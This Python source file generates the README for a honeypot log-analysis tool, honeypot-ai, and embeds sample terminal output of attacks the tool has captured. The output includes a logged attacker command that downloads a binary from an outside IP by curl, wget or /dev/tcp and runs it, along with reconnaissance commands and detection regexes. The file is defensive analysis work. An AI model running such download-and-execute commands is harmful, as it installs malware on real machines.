from .markdownwriterbase import *


class DocsMarkdownWriter(MarkdownWriterBase):
    """Writes markdown for the honeypot-ai project documentation and README"""

    GITHUB_BASE_URL = "https://github.com/LucasFaudman/honeypot-ai/blob/main/"

    def prepare(self):
        self.md_editors.append(self.add_description)
        self.md_editors.append(self.add_example_reports)
        self.md_editors.append(self.add_setup)
        self.md_editors.append(self.add_basic_usage)
        self.md_editors.append(self.add_advanced_usage)
        self.md_editors.append(self.add_default_config)
        self.custom_scripts_title = "Module Descriptions"
        self.md_editors.append(self.add_custom_scripts)

    def script_link(self, script):
        return link(script.split("/")[-1], f"{self.GITHUB_BASE_URL}{quote(script)}")

    def add_custom_scripts(self, md, *arg):
        scripts = {
            "main.py": {
                "description": "Main script for initializing and running all analyzer objects according to command line arguments and config file",
            },
            "attackanalyzer.py": {
                "description": "High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor",
            },
            "analyzerbase": {
                "description": "Base classes, utility functions, libraries, and constants for all analyzer modules",
                "common.py": "Imports and constants used by all analyzer modules",
                "baseobjects.py": "Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_",
                "attack.py": "Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers",
                "malware.py": "Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object",
                "session.py": "Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object",
                "sourceip.py": "SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object",
                "util.py": "Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text",
            },
            "loganalyzers": {
                "description": "Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories",
                "logparser.py": "Classes for reading all logs into Python objects with standardized keys",
                "logprocessor.py": "Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met.",
                "attackdirorganizer.py": "Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading",
                "attackdirreader.py": "Reads and counts log events in Attack directories organized by attackdirorganizer",
            },
            "openaianalyzers": {
                "description": "Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs",
                "aibase.py": "Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost",
                "completions.py": "OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code",
                "assistant.py": "OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects",
                "tools.py": "Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects",
            },
            "osintanalyzers": {
                "description": "Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object",
                "osintbase.py": "Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer",
                "ipanalyzer.py": "IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois",
                "malwareanalyzer.py": "MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB",
                "soupscraper.py": "SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects",

            },
            "markdownwriters": {
                "description": "Scripts for writing markdown files from Attack objects",
                "markdownwriterbase.py": "Base class for all markdown writers and markdown shortcut functions",
                "attackmarkdownwriter.py": "Markdown writer for Attack objects following ISC format",
                "ipmarkdownwriter.py": "Markdown writer for ipdata added to Attack objects by IPAnalyzer",
                "runstepsmarkdownwriter.py": "Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode",
                "docsmarkdownwriter.py": "Markdown writer for the honeypot-ai project documentation and README",
                "visualizer.py": "Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding)",
            },
            "setup.sh": {
                "description": "Setup script for installing the honeypot-ai project",
            },
            "setup": {
                "description": "Scripts for setting up the honeypot-ai project",
                "requirements.txt": "List of all required packages for the honeypot-ai project",
                "getchromedrier.py": "Utility script to download correct chromedriver for Selenium",
                "sync-logs.sh": "Utility script to sync logs from honeypot to honeypot-ai project logs directory",
                "install-zeek-on-honeypot.sh": "Utility script to install Zeek on a remote honeypot",
            },
        }

        script_md = ""

        for module, module_dict in scripts.items():
            module_md = h4(self.script_link(module))
            module_md += blockquote(module_dict.pop("description"))

            if module_dict:
                module_md += table(
                    ["Script", "Description"],
                    [[self.script_link(module + "/" + script), description]
                     for script, description in module_dict.items()]
                )

            script_md += module_md

        md += collapseable_section(script_md, self.custom_scripts_title, 2)

        return md

    def add_setup(self, md, data_object):
        setup = ""
        setup += h4("Step 1: Clone the Repository")
        setup += codeblock("git clone https://github.com/LucasFaudman/honeypot-ai", lang="bash")

        setup += h4(
            f"Step 2: Run the Setup Script {self.script_link('setup.sh')}")
        setup += codeblock("chmod +x honeypot-ai/setup.sh && honeypot-ai/setup.sh", lang="bash")
        setup += blockquote("This will install all required packages in a virtual environment and walk you through setting up your config.json file. ")
        setup += "\n" + blockquote(
            f"You will need your honeypot IP and login credentials to create {self.script_link('setup/sync-logs.sh')} and {self.script_link('setup/install-zeek-on-honeypot.sh')}.")

        setup += h4(
            f"Optional: Install Zeek on your Honeypot using {self.script_link('setup/install-zeek-on-honeypot.sh')}")
        setup += codeblock("honeypot-ai/install-zeek-on-honeypot.sh",
                           lang="bash")

        setup += h4(
            f"Step 3: Sync Logs from Honeypot to local logs directory using {self.script_link('setup/sync-logs.sh')}")
        setup += codeblock("honeypot-ai/sync-logs.sh", lang="bash")

        setup += h4("Step 4: Run Honeypot-AI with --help to see all command line arguments and options.")
        setup += codeblock("honeypot-ai/run.sh --help", lang="bash")
        setup += "\nOR\n"
        setup += codeblock("python3 honeypot-ai/main.py --help", lang="bash")

        md += collapseable_section(setup, "Setup", 2)
        return md

    def add_description(self, md, data_object):
        description = ""
        description += h1("honeypot-ai")
        description += h4(
            "A modular honeypot log analyzer and OSINT collector with OpenAI integration to easily create ISC style reports and interactively chat with AI about attacks. "
            "Currently supports Cowrie, DShield and Zeek logs. "
        )

        md += description
        return md

    def make_usage_example(self, description, command, output):
        usage_md = blockquote(description)
        usage_md += codeblock(command, lang="bash")
        if output:
            usage_md += collapseable_section(codeblock(output.strip()),
                                             "Output", 0, end_line=False)
        return usage_md

    def add_basic_usage(self, md, data_object):
        basic_usage = ""
        for key, example in BASIC_USAGE.items():
            basic_usage += self.make_usage_example(
                **example, output=OUTPUTS.get(key, ""))

        md += collapseable_section(basic_usage, "Basic Usage", 2)
        return md

    def add_advanced_usage(self, md, data_object):
        advanced_usage = ""
        advanced_usage += h3("All Command Line Arguments")
        help_text = data_object.get("config_parser").format_help()
        advanced_usage += codeblock(help_text, lang="bash")
        advanced_usage += blockquote(
            f"For more advanced usage see comments in the source code and/or edit DEFAULT_CONFIG in {self.script_link('main.py')}.")
        md += collapseable_section(advanced_usage, "Advanced Usage", 2)
        return md

    def add_default_config(self, md, data_object):
        md += collapseable_section(codeblock(data_object.get(
            "default_config"), lang='python'), "Default Config", 2)
        return md

    def add_example_reports(self, md, data_object):
        example_reports_md = h2("Attack Examples")
        titles = [f"example-reports/{dir.name}" for dir in sorted(Path("./reports").glob(
            "*"), key=lambda x: x.stat().st_mtime, reverse=True) if dir.is_dir()]
        reports_table = table(
            ["Attack", "AI Run Steps"],
            [[self.script_link(title), self.script_link(
                title+"/run-steps.md")] for title in titles]
        )
        example_reports_md += reports_table
        md += example_reports_md
        return md


BASIC_USAGE = {
    "load_from_logs_list": {
        "description": "Load attacks from logs then list all attacks",
        "command": "honeypot-ai/run.sh --load-from-logs --list-attacks",
    },


    "load_from_logs_sort": {
        "description": "Load attacks from logs then list first 5 attacks sorted in descending order by number of commands, then start time. Then print the commands for each attack",
        "command": "honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands",
    },


    "organize_attacks": {
        "description": "Organize attacks with at most 10 source IPs into attack directories for faster loading and to prepare for storing analysis results",
        "command": "honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10",
    },


    "load_from_attacks_dir": {
        "description": "Load attacks from the attacks directory that have at least 10 commands or at least 3 HTTP requests, then print the first command, 3 most common HTTP requests, and the most common src ip for each attack",
        "command": "honeypot-ai/run.sh --load-from-attacks-dir --min-commands 10 --min-http-requests 3 --print-attrs first_command most_common3_http_requests most_common_src_ip",
    },


    "only_attacks": {
        "description": "Load only attacks with IDs XXXX and YYYY from the attacks directory then print the source IPs, unique dst ports, sessions, commands, and malware for each attack",
        "command": "honeypot-ai/run.sh -lfa --only-attacks XXXX YYYY --print-attrs source_ips uniq_dst_ports sessions commands malware",
    },


    "analyze_write_export": {
        "description": "Analyze attack with ID XXXX using OpenAI and OSINT analyzers then write markdown and export to reports directory",
        "command": "honeypot-ai/run.sh -lfa --only-attack XXXX --analyze --write --export",
    },


    "chat_mode": {
        "description": "Enter chat mode to ask custom questions about attack with ID XXXX before analyzing, writing markdown, and exporting",
        "command": "honeypot-ai/run.sh -lfa --only-attack XXXX -AWE --chat",
    },


    "interactive": {
        "description": "Enter interactive Python shell to manually modify attacks before analyzing, writing markdown, and exporting",
        "command": "honeypot-ai/run.sh -lfa -AWE --interact",
    },


    "config_update": {
        "description": "Update config file with values from command line arguments",
        "command": "honeypot-ai/run.sh --config config.json --update-config --openai-api-key YOUR_API_KEY",
    },

}

OUTPUTS = {
    "load_from_logs_list": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --load-from-logs --list-attacks
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10ba43ed0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10ba43e10>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(50->49) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 7056: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6 <- bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747 by malware_urls
Merged 0 attacks by out of 7056 attempts (0.0000%) 
Merge Attacks Time: 0.7498s
(49->49) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\\?cd\\+/tmp')
Regex merged a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
Regex merged 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 into 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 on commands: re.compile('cat /proc/mounts; /bin/busybox [\\w\\d]+')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(49->42) - Merged 7 attacks with shared sig regexes

Exceptions:
Total: 0

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 42

Attacks:
1: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
2: Attack (chash: 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8), SourceIPs: 14, Sessions: 602, SSH: 602, Commands: 4, Cmdlogs: 1, Malware: 1 
3: Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1306, HTTP: 1306, Httplogs: 147 
4: Attack (chash: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804), SourceIPs: 7, Sessions: 634, SSH: 634, Commands: 2, Cmdlogs: 1, 
5: Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 6, Sessions: 767, SSH: 767, Commands: 1, Cmdlogs: 1, 
6: Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 18, HTTP: 18, Httplogs: 1 
7: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
8: Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1561, HTTP: 1561, Httplogs: 520 
9: Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 63, HTTP: 63, Httplogs: 6 
10: Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 48, HTTP: 48, Httplogs: 16 
11: Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 21, HTTP: 21, Httplogs: 2 
12: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
13: Attack (hhash: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98), SourceIPs: 3, Sessions: 3, HTTP: 3, Httplogs: 1 
14: Attack (chash: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80), SourceIPs: 2, Sessions: 1658, SSH: 1656, HTTP: 2, Commands: 1, Cmdlogs: 1, Httplogs: 1 
15: Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 20, HTTP: 20, Httplogs: 9 
16: Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 2, Sessions: 6, HTTP: 6, Httplogs: 2 
17: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
18: Attack (hhash: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e), SourceIPs: 2, Sessions: 2, HTTP: 2, Httplogs: 1 
19: Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
20: Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
21: Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 32, HTTP: 32, Httplogs: 15 
22: Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 30, HTTP: 30, Httplogs: 26 
23: Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 27, HTTP: 27, Httplogs: 27 
24: Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 24, HTTP: 24, Httplogs: 24 
25: Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 23, HTTP: 23, Httplogs: 22 
26: Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 12, HTTP: 12, Httplogs: 11 
27: Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 10, HTTP: 10, Httplogs: 10 
28: Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 1 
29: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
30: Attack (hhash: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
31: Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
32: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
33: Attack (chash: bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 1, Cmdlogs: 1, 
34: Attack (hhash: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
35: Attack (hhash: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
36: Attack (hhash: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
37: Attack (hhash: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
38: Attack (hhash: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
39: Attack (hhash: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
40: Attack (hhash: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
41: Attack (hhash: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
42: Attack (hhash: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
Total: 42
Honeypot AI Finished Successfully!    
    """,



    "load_from_logs_sort": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1167bacd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11683edd0>

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 5

Attacks:
1: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
2: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
3: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
4: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
5: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
Total: 5


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################



Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
##################################################################################
#                                    commands                                    #
##################################################################################
#                                                                                #
# ['/ip cloud print',                                                            #
#  'ifconfig',                                                                   #
#  'uname -a',                                                                   #
#  'cat /proc/cpuinfo',                                                          #
#  "ps | grep '[Mm]iner'",                                                       #
#  "ps -ef | grep '[Mm]iner'",                                                   #
#  'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log '    #
#  '/etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman ' #
#  '/dev/modem* /var/config/sms/*',                                              #
#  'echo Hi | cat -n']                                                           #
#                                                                                #
##################################################################################



Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
#############################################################
#                          commands                         #
#############################################################
#                                                           #
# ['sh',                                                    #
#  'shell',                                                 #
#  'enable',                                                #
